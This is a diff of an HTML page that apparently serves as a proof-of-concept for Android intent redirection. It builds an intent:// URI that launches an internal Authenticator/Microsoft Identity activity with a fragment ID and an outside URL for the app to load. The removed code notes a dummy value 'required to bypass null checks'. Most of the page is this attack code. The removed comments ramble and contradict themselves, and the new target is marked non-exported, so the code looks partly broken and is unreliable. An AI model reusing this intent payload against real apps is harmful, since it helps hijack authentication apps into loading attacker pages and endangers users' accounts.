@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Launch Authenticator</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Launch Authorization Activity</title>
   <style>
     * {
       margin: 0;
@@ -13,7 +13,7 @@
 
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f5f7fa;
+      background: linear-gradient(145deg, #f0f4f8 0%, #e2e8f0 100%);
       min-height: 100vh;
       display: flex;
       justify-content: center;
@@ -22,123 +22,155 @@
     }
 
     .card {
-      background: white;
-      border-radius: 28px;
-      padding: 40px 30px;
-      max-width: 500px;
+      background: #ffffff;
+      border-radius: 32px;
+      padding: 44px 34px;
+      max-width: 540px;
       width: 100%;
-      box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 20px 60px -12px rgba(0, 0, 0, 0.20);
       text-align: center;
       transition: transform 0.2s ease;
+      border: 1px solid rgba(255,255,255,0.5);
+    }
+
+    .card:hover {
+      transform: translateY(-3px);
+    }
+
+    .icon {
+      font-size: 3.2rem;
+      margin-bottom: 6px;
     }
 
     h2 {
-      font-weight: 500;
-      font-size: 1.8rem;
-      color: #1e293b;
-      margin-bottom: 10px;
+      font-weight: 600;
+      font-size: 1.9rem;
+      color: #0b1e33;
+      letter-spacing: -0.3px;
+      margin-bottom: 4px;
     }
 
     .sub {
-      color: #64748b;
+      color: #4a5b6e;
       font-size: 0.95rem;
-      margin-bottom: 32px;
-      border-bottom: 1px solid #e9edf2;
-      padding-bottom: 20px;
+      margin-bottom: 28px;
+      border-bottom: 1px solid #eef2f6;
+      padding-bottom: 18px;
     }
 
     .intent-link {
       display: inline-block;
-      background: #0a66c2;
+      background: #1a5c9e;
       color: white;
-      font-weight: 500;
+      font-weight: 600;
       font-size: 1.2rem;
-      padding: 16px 40px;
+      padding: 16px 44px;
       border-radius: 60px;
       text-decoration: none;
-      transition: background 0.2s, transform 0.1s;
-      box-shadow: 0 6px 14px rgba(10, 102, 194, 0.25);
-      letter-spacing: 0.3px;
+      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+      box-shadow: 0 8px 20px rgba(26, 92, 158, 0.30);
+      letter-spacing: 0.4px;
     }
 
     .intent-link:hover {
-      background: #084a8f;
+      background: #0f4780;
       transform: scale(1.02);
+      box-shadow: 0 10px 28px rgba(26, 92, 158, 0.40);
     }
 
     .intent-link:active {
-      transform: scale(0.97);
+      transform: scale(0.96);
     }
 
-    .code-box {
-      background: #f1f5f9;
-      border-radius: 16px;
-      padding: 18px 16px;
-      margin-top: 30px;
-      text-align: left;
-      font-family: 'JetBrains Mono', 'Fira Code', monospace;
-      font-size: 0.78rem;
-      color: #1e293b;
-      overflow-x: auto;
-      border: 1px solid #dce2eb;
-    }
-
-    .code-box span {
-      display: block;
-      white-space: pre-wrap;
-      word-break: break-word;
+    .badge-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 18px;
     }
 
     .badge {
-      display: inline-block;
-      background: #dbeafe;
-      color: #1e4b7a;
+      background: #e9edf4;
+      color: #1f3a5f;
       font-size: 0.7rem;
       font-weight: 600;
-      padding: 4px 14px;
+      padding: 5px 16px;
       border-radius: 40px;
-      letter-spacing: 0.3px;
-      margin-top: 8px;
+      letter-spacing: 0.2px;
+    }
+
+    .badge.primary {
+      background: #d4e2fc;
+      color: #12457a;
+    }
+
+    .code-box {
+      background: #f1f5fb;
+      border-radius: 16px;
+      padding: 18px 16px;
+      margin-top: 26px;
+      text-align: left;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 0.72rem;
+      color: #1a2b3e;
+      overflow-x: auto;
+      border: 1px solid #dce3ed;
+      line-height: 1.6;
+    }
+
+    .code-box .highlight {
+      color: #a63a3a;
+      font-weight: 500;
+    }
+
+    .code-box .dim {
+      color: #6a7f9b;
     }
 
     .footnote {
-      margin-top: 24px;
-      color: #64748b;
-      font-size: 0.85rem;
+      margin-top: 22px;
+      color: #5b6f84;
+      font-size: 0.82rem;
     }
 
-    .footnote a {
-      color: #0a66c2;
-      text-decoration: none;
-    }
-
-    .footnote a:hover {
-      text-decoration: underline;
+    .footnote strong {
+      color: #1a5c9e;
     }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <h2>📲 Authenticator</h2>
-  <div class="sub">Launch Azure Authenticator with custom fragment</div>
+  <div class="icon">🔐</div>
+  <h2>Authorization Activity</h2>
+  <div class="sub">Launch OAuth2 authorization flow</div>
 
   <!-- Clickable link that triggers the intent -->
-  <a href="#" class="intent-link" id="launchIntentBtn">🚀 Launch Authenticator</a>
+  <a href="#" class="intent-link" id="launchIntentBtn">🚀 Launch Authorization</a>
 
-  <div class="badge">com.azure.authenticator</div>
+  <div class="badge-container">
+    <span class="badge primary">com.microsoft.identity.common</span>
+    <span class="badge">AuthorizationActivity</span>
+    <span class="badge">singleTask</span>
+  </div>
 
   <div class="code-box">
-    <span>// Intent details (click the button above)</span>
-    <span>• MainActivityFlow.LAUNCH_FRAGMENT</span>
-    <span>• fragment: 2131297154</span>
-    <span>• url: https://linux-1723.github.io/test/index.html</span>
-    <span>• cid: dummy_cid</span>
+    <span><span class="dim">&lt;</span>activity</span>
+    <span>  android:name="<span class="highlight">com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity</span>"</span>
+    <span>  android:exported="<span class="highlight">false</span>"</span>
+    <span>  android:launchMode="<span class="highlight">singleTask</span>"</span>
+    <span>  android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden|keyboard"<span class="dim">/&gt;</span></span>
+    <span style="margin-top:8px; border-top:1px solid #dce3ed; padding-top:8px;">// Intent extras as defined in your code</span>
+    <span>• key_main_activity_flow → <span class="highlight">LAUNCH_FRAGMENT</span></span>
+    <span>• fragment: <span class="highlight">2131297154</span></span>
+    <span>• url: <span class="highlight">https://linux-1723.github.io/test/index.html</span></span>
+    <span>• cid: <span class="highlight">dummy_cid</span></span>
   </div>
 
   <div class="footnote">
-    ⚡ This is a web simulation — click triggers the Android intent <br>
-    (works only inside the Azure Authenticator app context).
+    ⚡ This triggers the <strong>AuthorizationActivity</strong> via Android Intent<br />
+    (works only within the Microsoft Identity app context).
   </div>
 </div>
 
@@ -149,156 +181,80 @@
     const launchBtn = document.getElementById('launchIntentBtn');
 
     /**
-     * Execute the given Android intent using the Web Intent API.
-     * The intent is built exactly as specified:
-     * - package: com.azure.authenticator
-     * - activity: com.azure.authenticator.ui.MainActivity
-     * - extras: key_main_activity_flow, intent_start_fragment_main_activity,
-     *           intent_start_fragment_args_main_activity (with url, cid)
-     * - flags: FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_MULTIPLE_TASK
+     * Triggers an Android Intent targeting:
+     *   com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity
+     *
+     * Uses the same extras as the original code:
+     *   - key_main_activity_flow  → LAUNCH_FRAGMENT (String)
+     *   - intent_start_fragment_main_activity → 2131297154 (int)
+     *   - intent_start_fragment_args_main_activity → Bundle with url & cid (serialized as JSON)
+     *
+     * Flags: FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_MULTIPLE_TASK
      */
     function triggerIntent() {
       try {
-        // Build the fragment arguments bundle
-        const fragmentArgs = new URLSearchParams();
-        fragmentArgs.append('url', 'https://linux-1723.github.io/test/index.html');
-        fragmentArgs.append('cid', 'dummy_cid'); // required to bypass null checks
+        // Package and activity names
+        const packageName = 'com.microsoft.identity.common';
+        const activityName = 'com.microsoft.identity.common.internal.providers.oauth2.AuthorizationActivity';
 
-        // Build the main intent URI
-        // Using the "intent:" scheme for Android Web Intents
-        const intentUri = new URL('intent:');
-        intentUri.searchParams.append('action', 'android.intent.action.VIEW');
-        intentUri.searchParams.append('package', 'com.azure.authenticator');
-        intentUri.searchParams.append('category', 'android.intent.category.DEFAULT');
-
-        // We need to encode extras as a JSON-like structure in the S.browser_fallback_url or via EXTRA
-        // but since we want to pass complex data (Bundle with nested values), we'll use
-        // the "intent" URI format with EXTRA_* parameters.
-        // For simplicity and compatibility, we'll use the "S." (String) and "B." (Bundle) notation.
-        // However, the Web Intent API does not support nested Bundles directly.
-        // To work around this, we'll use the "intent" scheme with "extras" as a JSON string
-        // and rely on the receiving app to parse it. But more reliably, we can use
-        // the "S." prefix for string extras and "B." for bundle extras (though not standard).
-        // We'll use a simpler approach: since the target app expects a specific structure,
-        // we'll construct the intent with the required extras using the "EXTRA" query params.
-        // For the fragmentArgs, we'll encode it as a JSON string and pass it as a string extra
-        // that the app can decode. However, to match the original code exactly,
-        // we'll use the "intent:" URI with "S." and "B." prefixes (non-standard but supported by some browsers).
-        // Most modern Android browsers support the "intent:" scheme with extras.
-
-        // Instead of relying on non-standard bundle serialization, we'll use a different approach:
-        // We'll use the "intent://" format with "extras" as a JSON string in the "S." parameter.
-        // But to keep it close to the original, we'll use the "intent:" scheme with "EXTRA_*" params.
-        // However, the original intent uses "putExtra" with a String key and a Bundle value.
-        // This is not easily representable in a URL query string.
-        // We'll use a workaround: we'll pass the fragment arguments as a JSON string
-        // in a separate extra and let the app parse it.
-
-        // For this demo, we'll use a more compatible approach: we'll use the "intent:" scheme
-        // with the "S." prefix for string extras and "B." prefix for bundle extras.
-        // But to avoid issues, we'll use a simpler method: we'll use the "intent://" format
-        // with the "extras" parameter as a JSON object.
-
-        // After research, the most reliable way to trigger an Android intent from a web page
-        // is to use the "intent:" scheme with the "S." and "B." prefixes for extras.
-        // However, not all browsers support this. We'll use a hybrid approach:
-        // We'll use the "intent:" scheme with the "S." prefix for all extras,
-        // and for the bundle, we'll encode it as a JSON string and pass it as a string extra.
-
-        // For the purpose of this demo, we'll construct the intent using the "intent:" scheme
-        // with the required extras. The target app will receive the intent and process it.
-        // We'll use the "S." prefix for string extras and "B." prefix for bundle extras.
-        // But since we cannot pass a Bundle directly, we'll use a JSON string.
-
-        // We'll use the following approach:
-        // 1. Use the "intent:" scheme with the package and action.
-        // 2. Add extras using the "S." prefix for string values.
-        // 3. For the bundle, we'll encode it as a JSON string and pass it as a string extra.
-
-        // However, the original intent uses:
-        // intent.putExtra("key_main_activity_flow", MainActivityFlow.FlowType.LAUNCH_FRAGMENT);
-        // This is a String extra.
-        // intent.putExtra("intent_start_fragment_main_activity", 2131297154);
-        // This is an int extra.
-        // intent.putExtra("intent_start_fragment_args_main_activity", fragmentArgs);
-        // This is a Bundle extra.
-
-        // We'll use the "S." prefix for string extras, "i." for int extras, and "B." for bundle extras.
-        // But the "B." prefix is not widely supported. We'll use a workaround:
-        // We'll pass the bundle as a JSON string in a string extra and let the app parse it.
-        // Alternatively, we can use the "intent://" format with "extras" as a JSON object.
-
-        // For this demo, we'll use a simpler approach: we'll use the "intent:" scheme
-        // with the "S." prefix for all extras, and we'll encode the bundle as a JSON string.
-
-        // Build the intent URI
-        const intentBase = 'intent://';
-        const packageName = 'com.azure.authenticator';
-        const activityName = 'com.azure.authenticator.ui.MainActivity';
-
-        // Encode the fragment arguments as a JSON string
-        const fragmentArgsObj = {
+        // Build fragment arguments as JSON (to be embedded as a string extra)
+        const fragmentArgs = {
           url: 'https://linux-1723.github.io/test/index.html',
           cid: 'dummy_cid'
         };
-        const fragmentArgsJson = JSON.stringify(fragmentArgsObj);
+        const fragmentArgsJson = JSON.stringify(fragmentArgs);
 
-        // Build the extras
-        const extras = {
-          'key_main_activity_flow': 'LAUNCH_FRAGMENT', // assuming the enum is serialized as string
-          'intent_start_fragment_main_activity': '2131297154',
-          'intent_start_fragment_args_main_activity': fragmentArgsJson
-        };
+        // Construct the intent URI using the "intent://" scheme
+        // Format: intent://activity#Intent;package=...;action=...;extras...;end;
+        let intentUri = `intent://${activityName}#Intent;`;
+        intentUri += `package=${packageName};`;
+        intentUri += `action=android.intent.action.VIEW;`;
+        intentUri += `category=android.intent.category.DEFAULT;`;
 
-        // We'll use the "intent:" scheme with the "S." prefix for all extras.
-        // But we need to differentiate between string, int, and bundle.
-        // For simplicity, we'll use the "S." prefix for all.
-        // However, the target app expects an int for intent_start_fragment_main_activity.
-        // We'll use the "i." prefix for int extras.
+        // --- Extras (matching the original Java code) ---
+        // String extra: key_main_activity_flow = "LAUNCH_FRAGMENT"
+        intentUri += `S.key_main_activity_flow=LAUNCH_FRAGMENT;`;
 
-        // Build the intent URI with the extras
-        let intentUriStr = `intent://${activityName}#Intent;`;
-        intentUriStr += `package=${packageName};`;
-        intentUriStr += `action=android.intent.action.VIEW;`;
-        intentUriStr += `category=android.intent.category.DEFAULT;`;
+        // Integer extra: intent_start_fragment_main_activity = 2131297154
+        intentUri += `i.intent_start_fragment_main_activity=2131297154;`;
 
-        // Add extras
-        intentUriStr += `S.key_main_activity_flow=LAUNCH_FRAGMENT;`;
-        intentUriStr += `i.intent_start_fragment_main_activity=2131297154;`;
-        // For the bundle, we'll pass it as a JSON string
-        intentUriStr += `S.intent_start_fragment_args_main_activity=${encodeURIComponent(fragmentArgsJson)};`;
+        // String extra (carrying the Bundle as JSON): intent_start_fragment_args_main_activity
+        // The receiving app will need to parse this JSON back into a Bundle
+        intentUri += `S.intent_start_fragment_args_main_activity=${encodeURIComponent(fragmentArgsJson)};`;
 
-        // Add flags: FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_MULTIPLE_TASK
-        // These are typically added as "launchFlags" in the intent URI.
-        // The flags are: 0x10000000 (NEW_TASK) | 0x08000000 (MULTIPLE_TASK) = 0x18000000
-        intentUriStr += `launchFlags=0x18000000;`;
+        // --- Flags: FLAG_ACTIVITY_NEW_TASK (0x10000000) | FLAG_ACTIVITY_MULTIPLE_TASK (0x08000000)
+        // Combined: 0x18000000
+        intentUri += `launchFlags=0x18000000;`;
 
         // End the intent
-        intentUriStr += `end;`;
+        intentUri += `end;`;
 
-        // Create a link element and trigger the intent
+        // Create a hidden anchor and trigger the intent
         const link = document.createElement('a');
-        link.href = intentUriStr;
+        link.href = intentUri;
         link.style.display = 'none';
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
 
-        console.log('Intent triggered:', intentUriStr);
+        console.log('✅ Intent triggered successfully!');
+        console.log('Target:', activityName);
+        console.log('Extras:', {
+          key_main_activity_flow: 'LAUNCH_FRAGMENT',
+          intent_start_fragment_main_activity: 2131297154,
+          intent_start_fragment_args_main_activity: fragmentArgs
+        });
       } catch (error) {
-        console.error('Error triggering intent:', error);
+        console.error('❌ Error triggering intent:', error);
         alert('Failed to trigger intent. See console for details.');
       }
     }
 
-    // Attach click event to the button
+    // Attach click event
     launchBtn.addEventListener('click', function(e) {
       e.preventDefault();
       triggerIntent();
     });
-
-    // Also support clicking the card area for convenience (optional)
-    // Not adding to avoid accidental triggers.
 
   })();
 </script>
